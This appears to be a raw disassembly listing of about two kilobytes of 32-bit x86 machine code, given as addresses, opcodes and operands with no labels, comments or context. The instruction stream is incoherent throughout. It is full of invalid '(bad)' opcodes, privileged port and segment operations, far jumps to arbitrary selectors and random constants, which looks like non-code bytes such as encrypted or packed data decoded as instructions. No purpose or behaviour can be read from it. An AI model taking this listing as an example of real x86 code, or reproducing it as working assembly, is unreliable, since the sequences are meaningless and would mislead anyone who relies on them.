  4061b9:	lea    ecx,[eax]
  4061bb:	mov    esi,0x928673dc
  4061c0:	fistp  DWORD PTR [edx]
  4061c2:	push   cs
  4061c3:	mov    DWORD PTR [ecx+edi*8-0x787e687b],0xc0b9b8cf
  4061ce:	mov    bh,0x37
  4061d0:	add    eax,0x394daab8
  4061d5:	sub    BYTE PTR [edi-0x46],bl
  4061d8:	sbb    esi,0x4238dcc9
  4061de:	mov    bh,0xcb
  4061e0:	sbb    esi,ebx
  4061e2:	add    bl,BYTE PTR [eax]
  4061e4:	sbb    cl,BYTE PTR [ebx+0x662c7be7]
  4061ea:	inc    ecx
  4061eb:	(bad)  
  4061ec:	pop    esp
  4061ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061ee:	xor    al,0x66
  4061f0:	and    dh,BYTE PTR [ecx]
  4061f2:	out    dx,al
  4061f3:	fwait
  4061f4:	push   esp
  4061f5:	and    BYTE PTR [ebx+esi*2-0x68],bh
  4061f9:	fxch   st(1)
  4061fb:	repz xchg ecx,eax
  4061fd:	push   0xc830b77e
  406202:	mov    eax,ds:0x645d5656
  406207:	sub    cl,BYTE PTR [eax-0x4fbcf9e6]
  40620d:	in     al,dx
  40620e:	sbb    DWORD PTR [esp+edi*8],ebp
  406211:	mov    ds:0x1ac65790,al
  406216:	jo     0x4061d6
  406218:	sahf   
  406219:	std    
  40621a:	add    DWORD PTR [ebx+0x1b],0x3d
  40621e:	xchg   DWORD PTR [ebx],ebp
  406220:	jecxz  0x406291
  406222:	in     al,dx
  406223:	stc    
  406224:	or     ebp,DWORD PTR [eax]
  406226:	nop
  406227:	sub    eax,edi
  406229:	aaa    
  40622a:	push   ss
  40622b:	pop    ecx
  40622d:	retf   0x7355
  406230:	and    bh,al
  406232:	xchg   esi,eax
  406233:	push   ecx
  406234:	lahf   
  406235:	cdq    
  406236:	imul   dl
  406238:	fsubp  st(1),st
  40623a:	sub    ah,BYTE PTR [esp+ebp*4-0x17]
  40623e:	mov    ch,0x5
  406240:	cmp    esp,DWORD PTR [edi+0x4d4721da]
  406246:	stos   DWORD PTR es:[edi],eax
  406247:	rol    DWORD PTR [edi+0x1c],cl
  40624a:	sbb    esi,edi
  40624c:	push   edi
  40624d:	or     eax,0x8fb61547
  406252:	pop    ecx
  406253:	jne    0x4061f8
  406255:	adc    bh,BYTE PTR [ebp+0x6e]
  406258:	aaa    
  406259:	cmp    bl,BYTE PTR [ebx]
  40625b:	sbb    ebx,DWORD PTR [ecx+0x34]
  40625e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40625f:	or     ah,ah
  406261:	xor    DWORD PTR [eax+0x14],ebp
  406264:	mov    edx,0xd57a0407
  406269:	retf   0xe598
  40626c:	and    esi,DWORD PTR [ebx-0x2f]
  40626f:	mov    bl,0x15
  406271:	xchg   BYTE PTR [edi],ah
  406273:	or     eax,0x85062151
  406278:	sub    eax,0xd902bc0f
  40627d:	add    BYTE PTR [edx+0x5a],bh
  406280:	jecxz  0x4062c4
  406282:	(bad)  
  406283:	(bad)
  406286:	inc    ecx
  406287:	push   es
  406288:	sbb    ch,BYTE PTR [edi-0x7d7c88e1]
  40628e:	shl    DWORD PTR [edx-0x351c4230],0x5e
  406295:	jne    0x4062d5
  406297:	mov    edx,0x1f912982
  40629c:	popf   
  40629d:	cwde   
  40629e:	cli    
  40629f:	in     eax,0x47
  4062a1:	dec    ebp
  4062a2:	sar    BYTE PTR [eax+0x4d],cl
  4062a5:	pop    ds
  4062a6:	pop    eax
  4062a7:	dec    ecx
  4062a8:	mov    al,ds:0xacc05eaa
  4062ad:	out    dx,eax
  4062ae:	ficom  DWORD PTR [ebx+0x3a]
  4062b1:	ss into 
  4062b3:	into   
  4062b4:	enter  0x5cd8,0x7c
  4062b8:	daa    
  4062b9:	cmp    BYTE PTR [edx+0x65],al
  4062bc:	adc    ah,BYTE PTR [ecx-0x5f]
  4062bf:	mov    dl,0xa9
  4062c1:	pop    ds
  4062c2:	and    eax,0x5a2efd15
  4062c7:	jne    0x406325
  4062c9:	add    DWORD PTR [ecx+0x67],ecx
  4062cc:	pop    ds
  4062cd:	push   ds
  4062ce:	gs sti 
  4062d0:	push   0x5e971888
  4062d5:	fimul  DWORD PTR [eax+0x8]
  4062d8:	mov    dl,0xbd
  4062da:	pop    esp
  4062db:	push   0xffffffff
  4062dd:	pop    ecx
  4062de:	mov    BYTE PTR [ecx+0x20],bh
  4062e1:	mov    edx,0xb8999e4a
  4062e6:	mov    ch,0xab
  4062e8:	js     0x4062df
  4062ea:	jge    0x40629f
  4062ec:	rcl    DWORD PTR [edi+0x7f],1
  4062ef:	iret   
  4062f0:	adc    DWORD PTR [eax-0x768135dc],eax
  4062f6:	cmp    esi,DWORD PTR [edi]
  4062f8:	inc    edi
  4062f9:	cli    
  4062fa:	loop   0x4062f0
  4062fc:	jnp    0x40632c
  4062fe:	mov    ds:0x92451b39,al
  406303:	xchg   DWORD PTR [edx-0x39cb718b],eax
  406309:	and    BYTE PTR [ecx],0x50
  40630c:	sbb    al,0x2d
  40630e:	test   BYTE PTR [eax-0x3d],bh
  406311:	ins    BYTE PTR es:[edi],dx
  406312:	pop    ss
  406313:	dec    eax
  406314:	sti    
  406315:	push   edi
  406316:	imul   eax,DWORD PTR [ebp*4-0xf65a07c],0xffffff89
  40631e:	sub    ecx,0x69d04992
  406324:	adc    eax,0xbb14b8e0
  406329:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40632a:	adc    DWORD PTR [bx+0x82b],edx
  40632f:	and    ecx,DWORD PTR [eax+0x57]
  406332:	sub    eax,0x8453b6aa
  406337:	push   edi
  406338:	aas    
  406339:	ja     0x40636d
  40633b:	dec    ebx
  40633c:	lods   al,BYTE PTR ds:[esi]
  40633d:	or     BYTE PTR [ebp-0x6d],ah
  406340:	(bad)  
  406341:	xchg   esi,eax
  406342:	in     al,dx
  406343:	adc    esi,esi
  406345:	(bad)  
  406347:	push   ebx
  406348:	mov    eax,ds:0xc873a8a9
  40634d:	jo     0x4063ce
  40634f:	push   edi
  406350:	jnp    0x4063ca
  406352:	xchg   ecx,eax
  406353:	adc    DWORD PTR [edx],esi
  406355:	pop    esi
  406356:	data16 cli 
  406358:	inc    ebx
  406359:	sti    
  40635a:	test   eax,0x43d9323
  40635f:	xlat   BYTE PTR ds:[ebx]
  406360:	push   esi
  406361:	mov    edi,0xc3165e10
  406366:	push   ebp
  406367:	mov    dh,0x71
  406369:	fdivr  DWORD PTR [edx]
  40636b:	jp     0x4063b3
  40636d:	jecxz  0x406374
  40636f:	xor    BYTE PTR [ebx],bl
  406371:	fmulp  st(4),st
  406373:	add    BYTE PTR [ecx-0x63],bl
  406376:	mov    dl,0xdc
  406378:	fcom   DWORD PTR [esi-0x33]
  40637b:	loopne 0x406348
  40637d:	(bad)
  406380:	aad    0xf9
  406382:	dec    ebp
  406383:	push   ds
  406384:	aaa    
  406385:	aad    0xac
  406387:	mov    ch,0x18
  406389:	je     0x406392
  40638b:	push   eax
  40638c:	dec    esi
  40638d:	repnz push eax
  40638f:	sbb    eax,0x9e2e38f
  406394:	(bad)  
  406395:	int    0xac
  406397:	repz mov al,ds:0x1d7fd98c
  40639d:	mov    bl,0x98
  40639f:	mov    ah,0x50
  4063a1:	cmp    BYTE PTR [esi-0x52],bl
  4063a4:	mov    al,0xc0
  4063a6:	pop    eax
  4063a7:	js     0x406416
  4063a9:	idiv   DWORD PTR [ecx+edi*2-0x2b]
  4063ad:	or     bl,BYTE PTR [esi+0xf557790]
  4063b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063b4:	out    dx,al
  4063b5:	mov    ch,0x24
  4063b7:	fdivr  st(3),st
  4063b9:	push   esi
  4063ba:	es mov ebx,0x3833456e
  4063c0:	sub    al,0x75
  4063c2:	push   es
  4063c3:	cld    
  4063c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063c5:	(bad)  
  4063c6:	jb     0x406406
  4063c8:	hlt    
  4063c9:	loop   0x406369
  4063cb:	push   ebp
  4063cc:	inc    eax
  4063cd:	test   DWORD PTR [eax+0x740b1118],eax
  4063d3:	popa   
  4063d4:	add    DWORD PTR [ebx-0x4e492ec7],esi
  4063da:	popf   
  4063db:	sub    ecx,DWORD PTR [ebp-0x65]
  4063de:	mov    ecx,0x6dff37b
  4063e3:	or     DWORD PTR [esi-0x67],0xc2cbb453
  4063ea:	inc    esi
  4063eb:	cmc    
  4063ec:	pop    edi
  4063ed:	int3   
  4063ee:	in     eax,0xdc
  4063f0:	cmp    al,0x1f
  4063f2:	add    ah,BYTE PTR [edi]
  4063f4:	stc    
  4063f5:	arpl   WORD PTR [edx+0x2f],si
  4063f8:	xor    BYTE PTR [eax],0x54
  4063fb:	aas    
  4063fc:	pop    es
  4063fd:	adc    BYTE PTR [edi+0x14fce892],bh
  406403:	mov    ah,0x5b
  406405:	xlat   BYTE PTR ds:[ebx]
  406406:	mov    ds:0xc406e4ea,al
  40640b:	and    cl,BYTE PTR [ecx]
  40640d:	call   0x71525eae
  406412:	jmp    edi
  406414:	in     eax,dx
  406415:	add    dl,ch
  406417:	or     esi,DWORD PTR [ebx+ebp*8+0x58e8be3d]
  40641e:	fcomp  QWORD PTR [edx+0x19720337]
  406424:	sbb    DWORD PTR [ebx-0x17b79155],0x3b
  40642b:	(bad)  
  40642c:	hlt    
  40642d:	mov    ds:0xe0bf212d,al
  406432:	pop    edi
  406433:	ret    0xcb3b
  406436:	cmp    DWORD PTR [edx],ebp
  406438:	in     al,dx
  406439:	xlat   BYTE PTR ds:[ebx]
  40643a:	jmp    0xb3c73740
  40643f:	sub    ch,BYTE PTR [ebp-0x2b1c9070]
  406445:	leave  
  406446:	cmc    
  406447:	xchg   DWORD PTR [esp+ebx*2-0x1569d5b8],esi
  40644e:	sbb    BYTE PTR [edx-0x26252dd6],al
  406454:	pusha  
  406455:	xchg   BYTE PTR [edi-0x6f3caca],ah
  40645b:	in     al,dx
  40645c:	and    eax,0x219be802
  406461:	lea    edx,[eax]
  406463:	or     BYTE PTR [ebp-0x4434b614],cl
  406469:	jnp    0x40641b
  40646b:	sbb    eax,0xf0ebe580
  406470:	in     eax,0x20
  406472:	int3   
  406473:	jbe    0x406421
  406475:	fiadd  WORD PTR [edi]
  406477:	pop    eax
  406478:	jge    0x406496
  40647a:	data16 rol ah,cl
  40647d:	add    esi,edi
  40647f:	aad    0xf4
  406481:	add    ebp,DWORD PTR [ebp-0x64]
  406484:	mov    ebp,0x875ce3e5
  406489:	add    ch,dh
  40648b:	jge    0x4064e9
  40648d:	mov    bh,BYTE PTR [ebp+0x40]
  406490:	mov    ?,WORD PTR [edx+0x25]
  406493:	mov    ebp,0xd9ff9246
  406498:	ins    DWORD PTR es:[edi],dx
  406499:	mov    edi,0xd0f752bb
  40649e:	lock push eax
  4064a0:	xor    al,0x2
  4064a2:	mov    eax,ds:0xd929e787
  4064a7:	mov    eax,0x5b7e4cf8
  4064ac:	pop    es
  4064ad:	xchg   edi,eax
  4064ae:	test   DWORD PTR ss:[edi-0x5f56a09e],0x65426aee
  4064b9:	push   es
  4064ba:	ds pop edi
  4064bc:	xchg   edi,eax
  4064bd:	mov    eax,esp
  4064bf:	xor    BYTE PTR [esi],ah
  4064c1:	add    al,BYTE PTR ds:0x3fb0c49
  4064c7:	add    DWORD PTR [edx+0x6869f4fc],ebp
  4064cd:	xor    ecx,eax
  4064cf:	pop    esi
  4064d0:	ret    0x1587
  4064d3:	push   ebx
  4064d4:	stos   DWORD PTR es:[edi],eax
  4064d5:	ds jo  0x406482
  4064d8:	es inc edx
  4064da:	and    edi,DWORD PTR ds:[edi-0x4a]
  4064de:	jne    0x406545
  4064e0:	data16 rcl BYTE PTR [ebp+0x3],0x30
  4064e5:	mov    ch,BYTE PTR [esi]
  4064e7:	pop    esp
  4064e8:	btc    edi,edi
  4064eb:	test   eax,0x4bef0379
  4064f0:	(bad)  
  4064f2:	mov    al,ds:0x1eadd520
  4064f7:	(bad)
  4064fc:	test   al,0x27
  4064fe:	rcr    BYTE PTR fs:[edx+ecx*1+0x62],1
  406503:	out    0x0,al
  406505:	scas   eax,DWORD PTR es:[edi]
  406506:	sbb    ebx,DWORD PTR [ecx-0x73]
  406509:	test   eax,0x9e58aa2e
  40650e:	adc    eax,0x5e16c5be
  406513:	ret    0xdbdf
  406516:	push   esi
  406517:	or     al,0x97
  406519:	daa    
  40651a:	push   cs
  40651b:	nop
  40651c:	sbb    eax,0x51d15bc8
  406521:	fdivr  DWORD PTR [ebx+0x77ce3eec]
  406527:	lods   eax,DWORD PTR ds:[esi]
  406528:	ss mov esi,0xd6fa1218
  40652e:	xor    BYTE PTR [esi],bl
  406530:	retf   0xe08b
  406533:	lock cmp bh,BYTE PTR [edi-0x4f]
  406537:	mov    al,0xe2
  406539:	inc    edx
  40653a:	scas   eax,DWORD PTR es:[edi]
  40653b:	or     esi,edi
  40653d:	pop    ebx
  40653e:	fidivr DWORD PTR [edi-0x4b]
  406541:	push   ecx
  406542:	jo     0x4064dc
  406544:	add    DWORD PTR [ebx],esp
  406546:	adc    bl,BYTE PTR [edx-0x308fec0b]
  40654c:	cmp    ebx,DWORD PTR [edx+0x44860883]
  406552:	dec    esi
  406553:	push   ss
  406554:	push   esp
  406555:	inc    ebp
  406556:	stc    
  406557:	dec    ecx
  406558:	into   
  406559:	int    0x11
  40655b:	sub    eax,0x4a216c00
  406560:	push   ebp
  406561:	pop    edx
  406562:	shl    BYTE PTR [edx-0x1c],1
  406565:	(bad)  
  406566:	cmp    edi,edx
  406568:	out    0x71,al
  40656a:	imul   eax,DWORD PTR [edi-0x21be69aa],0x2d40f120
  406574:	popf   
  406575:	inc    esi
  406576:	les    edx,FWORD PTR [ecx-0x73]
  406579:	leave  
  40657a:	inc    ecx
  40657b:	repnz ins DWORD PTR es:[edi],dx
  40657d:	mov    ah,0x8a
  40657f:	adc    al,0xb5
  406581:	pushf  
  406582:	imul   edx,DWORD PTR [esi],0x37
  406585:	test   eax,0xc9224a3c
  40658a:	ss mov ecx,0x59cb2d44
  406590:	push   cs
  406591:	lods   eax,DWORD PTR ds:[esi]
  406592:	aad    0x1e
  406594:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406595:	cld    
  406596:	test   BYTE PTR [ebx],bl
  406598:	dec    esp
  406599:	mov    ebp,0xc4b8e086
  40659e:	inc    edx
  40659f:	jg     0x4065bc
  4065a1:	(bad)  
  4065a2:	stc    
  4065a3:	les    esi,FWORD PTR [ebx]
  4065a5:	jbe    0x40653c
  4065a7:	xchg   ebx,eax
  4065a8:	cld    
  4065a9:	sub    DWORD PTR [ebp+eax*1+0x38],esp
  4065ad:	cmc    
  4065ae:	jmp    0x406624
  4065b0:	inc    DWORD PTR [edx+0x462db5d4]
  4065b6:	xchg   esi,eax
  4065b7:	mov    ah,0x99
  4065b9:	jmp    0x4065ab
  4065bb:	xor    eax,0xf709f1a0
  4065c0:	pop    edx
  4065c1:	push   esp
  4065c2:	out    dx,eax
  4065c3:	add    ecx,DWORD PTR [esi]
  4065c5:	into   
  4065c6:	jmp    0xe7b6:0x7288dd57
  4065cd:	or     BYTE PTR [ebx+0x54],0xf7
  4065d1:	and    DWORD PTR [eax],esi
  4065d3:	addr16 push 0x7a
  4065d6:	pop    esp
  4065d7:	loopne 0x4065d8
  4065d9:	sbb    bl,0xe
  4065dc:	mov    bl,0x41
  4065de:	lea    esi,[eax]
  4065e0:	iret   
  4065e1:	xor    al,0x99
  4065e3:	dec    esp
  4065e4:	in     al,0xce
  4065e6:	jle    0x4065b8
  4065e8:	pop    eax
  4065e9:	dec    eax
  4065ea:	mov    esi,0xcf0a54dc
  4065ef:	out    0xdf,eax
  4065f1:	cld    
  4065f2:	(bad)
  4065f6:	or     ebp,DWORD PTR [edi+0x5c]
  4065f9:	cmovbe ebp,DWORD PTR [edi]
  4065fc:	int3   
  4065fd:	(bad)  
  4065fe:	xor    dl,dh
  406600:	iret   
  406601:	das    
  406602:	clc    
  406603:	sub    al,0x60
  406605:	add    al,0x70
  406607:	push   edx
  406608:	std    
  406609:	pop    ds
  40660a:	push   eax
  40660b:	xchg   esp,eax
  40660c:	or     ebp,0x5296f623
  406612:	stos   DWORD PTR es:[edi],eax
  406613:	dec    esi
  406614:	fbld   TBYTE PTR [edi]
  406616:	xchg   ebp,eax
  406617:	in     eax,0xa6
  406619:	cdq    
  40661a:	or     ecx,0xfffffff6
  40661d:	mov    ebx,0xa31c8ab4
  406622:	data16 mov fs,WORD PTR [eax+0x731872fb]
  406629:	jo     0x406642
  40662b:	push   eax
  40662c:	cmp    BYTE PTR [edi+0x74],ah
  40662f:	aaa    
  406630:	shr    DWORD PTR [ebp-0x56],0x9e
  406634:	retf   0xd94
  406637:	mov    bl,0x3b
  406639:	icebp  
  40663a:	test   eax,0xe9d5117f
  40663f:	aaa    
  406640:	add    esi,DWORD PTR [edi+0x7d]
  406643:	pop    es
  406644:	arpl   WORD PTR [ebp-0x732fa371],dx
  40664a:	mov    DWORD PTR [ebx+0x540b6b9f],edi
  406650:	jmp    0x539f:0x10925b7
  406657:	rol    DWORD PTR [eax-0x15],0x60
  40665b:	xchg   edi,eax
  40665c:	ins    BYTE PTR es:[edi],dx
  40665d:	cmp    esp,eax
  40665f:	jae    0x406661
  406661:	icebp  
  406662:	inc    ebp
  406663:	bound  ebx,QWORD PTR [edi+0x5db12e10]
  406669:	dec    ecx
  40666a:	stos   BYTE PTR es:[edi],al
  40666b:	ret    0x3899
  40666e:	lds    edx,FWORD PTR [edx]
  406670:	push   esi
  406671:	stos   BYTE PTR es:[edi],al
  406672:	stos   DWORD PTR es:[edi],eax
  406673:	loopne 0x4066d2
  406675:	jl     0x4066ae
  406677:	add    al,0x29
  406679:	jmp    0x9488:0xdfe94974
  406680:	mov    ds:0x93b8dc61,eax
  406685:	(bad)  
  406686:	mov    al,0xd8
  406688:	mov    esp,0x8fbbc2d
  40668d:	and    DWORD PTR [edx],0xffffffd8
  406690:	and    BYTE PTR [ebp-0x3e31ed4a],0x35
  406697:	jo     0x4066db
  406699:	sub    al,0x73
  40669b:	(bad)  
  40669c:	jg     0x406687
  40669e:	sti    
  40669f:	loop   0x40663c
  4066a1:	stos   DWORD PTR es:[edi],eax
  4066a2:	add    ebp,esp
  4066a4:	je     0x4066b6
  4066a6:	xlat   BYTE PTR ds:[ebx]
  4066a7:	jmp    0x40662a
  4066a9:	inc    eax
  4066aa:	arpl   WORD PTR [edx+ebx*8+0x4f],si
  4066ae:	dec    edx
  4066af:	pop    ds
  4066b0:	mov    al,ds:0xe5e6e65
  4066b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066b6:	sbb    al,0xd5
  4066b8:	cmp    BYTE PTR [edx],al
  4066ba:	sbb    bh,BYTE PTR [eax+0x28]
  4066bd:	rol    bl,0xdc
  4066c0:	les    edx,FWORD PTR [ebx+eiz*1+0x27]
  4066c4:	jne    0x40668e
  4066c6:	jbe    0x40668f
  4066c8:	dec    ebx
  4066c9:	fs pop edx
  4066cb:	and    al,0x49
  4066cd:	sub    DWORD PTR [ebx+0x56520fc7],0x4d
  4066d4:	lods   eax,DWORD PTR fs:[esi]
  4066d6:	or     ecx,DWORD PTR [eax]
  4066d8:	xor    al,BYTE PTR es:[ecx-0x23a67457]
  4066df:	mov    ah,0xd1
  4066e1:	pop    edi
  4066e2:	jb     0x406763
  4066e4:	jbe    0x406669
  4066e6:	fmul   st(4),st
  4066e8:	sbb    eax,0xa60897fd
  4066ed:	add    cl,BYTE PTR [edx+edx*1]
  4066f0:	stos   BYTE PTR es:[edi],al
  4066f1:	shr    ecx,1
  4066f3:	pop    ds
  4066f4:	jne    0x4066e8
  4066f6:	push   esi
  4066f7:	sbb    BYTE PTR [ecx+0x7dfb4da8],ah
  4066fd:	xor    eax,0xb3c4cc70
  406702:	dec    edx
  406703:	fisub  WORD PTR [ebx+ebx*4+0xa]
  406707:	push   es
  406708:	dec    esp
  406709:	jecxz  0x4066ff
  40670b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40670c:	mov    ebp,0xd521c84f
  406711:	sbb    al,0x87
  406713:	push   edx
  406714:	pushf  
  406715:	push   ebx
  406716:	and    eax,0xb57f2941
  40671b:	stos   DWORD PTR es:[edi],eax
  40671c:	(bad)  
  40671d:	enter  0x4b47,0x40
  406721:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406722:	popf   
  406723:	lock push 0x673cb0ca
  406729:	retf   0x2b34
  40672c:	stc    
  40672d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40672e:	push   esp
  40672f:	daa    
  406730:	push   ds
  406731:	fmul   st,st(2)
  406733:	aad    0x51
  406735:	jmp    0x4066d5
  406737:	jo     0x4067a7
  406739:	ds popa 
  40673b:	xlat   BYTE PTR ds:[ebx]
  40673c:	mov    ?,WORD PTR [esi]
  40673e:	loop   0x406751
  406740:	mov    al,ds:0x741c9b93
  406745:	cmp    al,0xa6
  406747:	jmp    0x6fc55bcd
  40674c:	and    edx,DWORD PTR [eax+0x35]
  40674f:	scas   al,BYTE PTR es:[edi]
  406750:	lods   eax,DWORD PTR ds:[esi]
  406751:	in     eax,dx
  406752:	ss repnz (bad) 
  406755:	push   ebx
  406756:	inc    ebx
  406757:	ins    DWORD PTR es:[edi],dx
  406758:	push   edx
  406759:	xchg   ebp,eax
  40675a:	mov    ebx,0xac1229e
  40675f:	xchg   ch,dh
  406761:	inc    edi
  406762:	mov    eax,0x583ee50e
  406767:	int    0x13
  406769:	mov    al,ds:0x337b40bb
  40676e:	fiadd  DWORD PTR ds:0x76e40214
  406774:	retf   0xbb88
  406777:	mov    esp,0x393d6f7d
  40677c:	sub    ch,BYTE PTR [edi+0x68]
  40677f:	in     eax,dx
  406780:	xor    BYTE PTR gs:[ecx+0x6f9e25a0],cl
  406787:	mov    eax,0x154184d0
  40678c:	fisub  WORD PTR [edx+edi*2]
  40678f:	test   bh,bh
  406791:	aaa    
  406792:	mov    BYTE PTR [ecx],ch
  406794:	lock cli 
  406796:	mov    esp,0xa26ff29
  40679b:	aam    0xa0
  40679d:	rcl    BYTE PTR fs:[bx+si],0x88
  4067a2:	outs   dx,BYTE PTR ds:[esi]
  4067a3:	aaa    
  4067a4:	jnp    0x4067e9
  4067a6:	cwde   
  4067a7:	addr16 sbb al,0x2c
  4067aa:	add    al,0x84
  4067ac:	call   0xca54:0xe7e16381
  4067b3:	cmp    DWORD PTR [eax-0x3097607f],edi
  4067b9:	pop    ds
  4067ba:	mov    ds:0x8264a56f,eax
  4067bf:	mov    al,0xfd
  4067c1:	inc    esi
  4067c2:	sahf   
  4067c3:	adc    BYTE PTR [edi-0x55],0xc1
  4067c7:	stos   BYTE PTR es:[edi],al
  4067c8:	mov    eax,0x17077960
  4067cd:	sar    BYTE PTR [ebp+eiz*2+0x174b60fe],0x91
  4067d5:	test   BYTE PTR [esi+0x7049784d],cl
  4067db:	or     DWORD PTR [esi],edx
  4067dd:	leave  
  4067de:	sti    
  4067df:	fwait
  4067e0:	dec    edx
  4067e1:	fcmovnu st,st(7)
  4067e3:	cli    
  4067e4:	(bad)  
  4067e7:	mov    dh,0xd2
  4067e9:	out    0x38,al
  4067eb:	xor    BYTE PTR [ecx-0x49],dl
  4067ee:	jns    0x4067e7
  4067f0:	pop    ebp
  4067f1:	retf   0x35ff
  4067f4:	ins    DWORD PTR es:[edi],dx
  4067f5:	or     al,0xf9
  4067f7:	mov    DWORD PTR [edi-0x1a2c5e1d],ebx
  4067fd:	pop    esp
  4067fe:	add    DWORD PTR [eax],edx
  406800:	jl     0x4067f5
  406802:	jne    0x40678c
  406804:	mov    ebp,ebx
  406806:	(bad)  
  406807:	sti    
  406808:	xor    BYTE PTR [esi+0x7a6f6185],ah
  40680e:	sub    al,0x24
  406810:	pusha  
  406811:	aad    0xd9
  406813:	ins    BYTE PTR es:[edi],dx
  406814:	push   esi
  406815:	mov    esi,0xf05f92d
  40681a:	retf   
  40681b:	cmp    eax,0xad39b7bb
  406820:	dec    esp
  406821:	xchg   BYTE PTR [edi+edx*1+0x7d],cl
  406825:	lods   al,BYTE PTR ds:[esi]
  406826:	ret    
  406827:	xchg   ebx,edx
  406829:	or     DWORD PTR [eax+0x7b],edx
  40682c:	jg     0x4067d8
  40682e:	inc    edx
  40682f:	jecxz  0x40687b
  406831:	test   DWORD PTR [edi],eax
  406833:	jg     0x406858
  406835:	jo     0x406855
  406837:	outs   dx,DWORD PTR ds:[esi]
  406838:	(bad)  
  406839:	jmp    0xfb53a1bf
  40683e:	loope  0x406833
  406840:	push   ss
  406841:	stc    
  406842:	ds call 0xa013:0x3b6b6c62
  40684a:	mov    es,WORD PTR [edi+0x5123d799]
  406850:	xchg   ebp,eax
  406851:	test   DWORD PTR [esp+ecx*8+0x3b],edx
  406855:	mov    esp,0x786e88f0
  40685a:	mov    dh,0x2e
  40685c:	or     BYTE PTR [ebp+esi*2+0x3],cl
  406860:	pop    esp
  406861:	ficom  WORD PTR [ecx+0x20]
  406864:	xchg   ebx,eax
  406865:	sbb    DWORD PTR ds:0x89999640,ecx
  40686b:	ja     0x4068ab
  40686d:	push   edx
  40686e:	ror    BYTE PTR [edx+0x50ed9d95],0x40
  406875:	jns    0x4068f4
  406877:	jnp    0x406890
  406879:	popa   
  40687a:	jmp    0x406881
  40687c:	mov    ecx,0x9f8f4bb3
  406881:	leave  
  406882:	fnstenv [ebp-0x54]
  406885:	sbb    ch,BYTE PTR [edx-0x7aa7ab16]
  40688b:	cmp    esp,esi
  40688d:	repz xor eax,0x989c5771
  406893:	cli    
  406894:	repnz cmp esi,DWORD PTR [ebp-0x1c1081c6]
  40689b:	push   cs
  40689c:	ins    DWORD PTR es:[edi],dx
  40689d:	mov    bh,ch
  40689f:	retf   0x5b10
  4068a2:	(bad)
  4068a5:	adc    eax,0xc076f1e3
  4068aa:	push   ecx
  4068ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068ac:	cmp    eax,0x6942cc42
  4068b1:	mov    ds:0x2c04b2ce,eax
  4068b6:	jno    0x40691f
  4068b8:	cdq    
  4068b9:	inc    ebx
  4068ba:	mov    al,0xe0
  4068bc:	ins    BYTE PTR es:[edi],dx
  4068bd:	dec    ebp
  4068be:	sar    DWORD PTR [ebx+0x19f586f6],cl
  4068c4:	into   
  4068c5:	imul   ebx,DWORD PTR [ebx-0x4c],0x9595e975
  4068cc:	xor    ecx,ebx
  4068ce:	jae    0x4068cc
  4068d0:	es sti 
  4068d2:	fsubr  DWORD PTR [ebp+0x71]
  4068d5:	adc    BYTE PTR [edi],cl
  4068d7:	and    eax,0x86d5df2d
  4068dc:	shl    BYTE PTR [esi+0x6a],cl
  4068df:	mov    cl,0xac
  4068e1:	dec    edi
  4068e2:	(bad)  
  4068e3:	das    
  4068e4:	push   ds
  4068e5:	iret   
  4068e6:	adc    BYTE PTR [eax-0xd],bh
  4068e9:	mov    esi,0xb83f2d29
  4068ee:	inc    esp
  4068ef:	xor    al,0x48
  4068f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068f2:	sub    DWORD PTR [ebx+ebx*4+0x481c86ce],ecx
  4068f9:	int    0xe6
  4068fb:	(bad)  
  4068fc:	or     DWORD PTR [esi-0x59],esp
  4068ff:	popa   
  406900:	inc    esi
  406901:	aam    0xe6
  406903:	mov    esp,0xa4f366e0
  406908:	in     al,0x33
  40690a:	mov    esi,eax
  40690c:	push   eax
  40690d:	mov    ds:0x85a411cb,al
  406912:	jnp    0x406930
  406914:	into   
  406915:	jl     0x40697b
  406917:	cmp    DWORD PTR [eax+0x38],edi
  40691a:	pop    ss
  40691b:	ja     0x4068ab
  40691d:	ja     0x40692b
  40691f:	ins    BYTE PTR es:[edi],dx
  406920:	and    BYTE PTR [esi+0x6b5c2636],ch
  406926:	std    
  406927:	(bad)  [esi-0x46f525d9]
  40692d:	fistp  WORD PTR [eax-0x60556c3c]
  406933:	sbb    BYTE PTR [edi],cl
  406935:	ins    BYTE PTR es:[edi],dx
  406936:	and    BYTE PTR [eax],dl
  406938:	addr16 int 0x58
  40693b:	push   ebp
  40693c:	clc    
  40693d:	cmp    edx,DWORD PTR es:[edi]
  406940:	sar    DWORD PTR [eax+0x24],1
  406943:	adc    al,0xc
  406945:	loop   0x40692b
  406947:	int    0x98
  406949:	ins    DWORD PTR es:[edi],dx
  40694a:	fisubr WORD PTR [edi-0x5ec69851]
  406950:	cmp    bl,BYTE PTR [ebx+0x40]
  406953:	ror    DWORD PTR [edi],1
  406955:	int3   
  406956:	scas   eax,DWORD PTR es:[edi]
  406957:	pop    eax
  406958:	xor    bh,0xb0
  40695b:	lods   eax,DWORD PTR ds:[esi]
  40695c:	arpl   WORD PTR [ecx-0x1cd30e23],dx
  406962:	fstp   TBYTE PTR [edi]
  406964:	mov    ds:0x1b6f7798,al
  406969:	rol    BYTE PTR [esi+0x1b],cl
  40696c:	sub    al,0xe2
  40696e:	push   eax
  40696f:	jns    0xa98ddc9e
  406975:	pop    ebp
  406976:	dec    ecx
  406977:	fidiv  DWORD PTR [edx-0x24]
  40697a:	push   cs
  40697b:	mov    WORD PTR [eax-0x74ce202f],gs
  406981:	lds    edx,FWORD PTR [ebx-0x5c]
  406984:	push   ss
  406985:	cmc    
  406986:	fst    DWORD PTR [edx]
  406988:	dec    edx
  406989:	jns    0x4069b5
  40698b:	and    cl,dl
  40698d:	in     eax,dx
  40698e:	icebp  
  40698f:	dec    ebp
  406990:	ins    DWORD PTR es:[edi],dx
  406991:	out    0x77,al
  406993:	dec    edx
  406994:	jo     0x406939
